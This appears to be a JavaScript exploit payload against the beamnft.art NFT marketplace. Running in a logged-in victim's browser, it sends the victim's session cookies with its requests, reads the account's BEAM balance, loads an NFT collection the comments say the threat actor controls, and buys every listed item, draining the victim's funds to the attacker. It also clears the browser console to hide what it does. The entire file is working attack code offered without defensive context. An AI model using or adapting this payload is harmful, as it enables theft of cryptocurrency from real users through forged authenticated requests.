buyNft = async (id, price) => {
  let url = `https://api.beamnft.art/nft/buy/${id}?price=${price}`;

  const nftBought = await fetch(url, {
    method: "POST",
    headers: {
      "Access-Control-Request-Headers": "*",
    },
    credentials: "include",
  });

  console.log(`NFT ID: ${id}`);
  console.log(`NFT Price: ${price}`);

  return nftBought;
};

exhaustFunds = async (balance, nfts) => {
  // balance in BEAM and GROTH
  let beamBalance = balance / 100000000;
  let grothBalance = balance;
  let transactionFee;

  console.clear(); // sanitize console

  console.log(`balance in BEAM: ${beamBalance} BEAM`);
  console.log(`balance in GROTH: ${grothBalance} GROTH\n\n`);

  // loop through nft object, show only nfts which are for sale (price > 0)
  for (let key in nfts) {
    if (nfts[key].price != 0) {
      let bought = await buyNft(nfts[key]._id, nfts[key].price);
      console.log(bought); // response to POST request
    }
  }
};

getData = async () => {
  // urls
  cid = "89389edd "; // Beam Apes CID (replace with threat actors collection ID)

  // fetch balance data
  const balance = await fetch("https://api.beamnft.art/user/get", {
    method: "GET",
    headers: {
      "Access-Control-Request-Headers": "*",
    },
    credentials: "include",
  });

  // fetch nfts from exploiters collection
  const nfts = await fetch(`https://api.beamnft.art/collection/get/${cid}`, {
    method: "GET",
    headers: {
      "Access-Control-Request-Headers": "*",
    },
    credentials: "include",
  });

  const balanceData = await balance.json();
  const nftData = await nfts.json();

  return [balanceData, nftData];
};

payload = async () => {
  let [balanceData, nftData] = await getData();
  let balance = balanceData.result.user.balances.BEAM.BEAM.a; // users balance (in GROTH)
  let nfts = nftData.result.nfts; // object containing nft data

  exhaustFunds(balance, nfts);
};

payload();
